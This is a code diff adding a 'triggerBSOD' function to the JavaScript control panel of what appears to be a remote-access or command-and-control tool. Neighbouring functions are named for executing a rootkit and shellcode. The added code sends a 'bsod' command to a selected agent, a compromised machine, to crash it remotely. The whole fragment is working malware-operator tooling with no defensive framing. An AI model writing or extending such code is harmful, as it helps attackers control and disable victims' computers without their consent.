@@ -821,6 +821,32 @@ async function executeRootkit() {
     });
 }
 
+// Trigger BSOD
+async function triggerBSOD() {
+    if (!currentAgent) return;
+    
+    showConfirm('⚠️ TRIGGER BLUE SCREEN OF DEATH? System will crash immediately!', async (confirmed) => {
+        if (!confirmed) return;
+        
+        try {
+            await fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    agentId: currentAgent.id,
+                    type: 'bsod'
+                })
+            });
+            
+            showNotification('BSOD triggered', '💥');
+            commandCount++;
+            addLog('error', 'BSOD triggered - system will crash');
+        } catch (e) {
+            showNotification(`Error: ${e.message}`, '❌');
+        }
+    });
+}
+
 // Execute Shellcode
 async function executeShellcodeFunc() {
     if (!currentAgent) return;
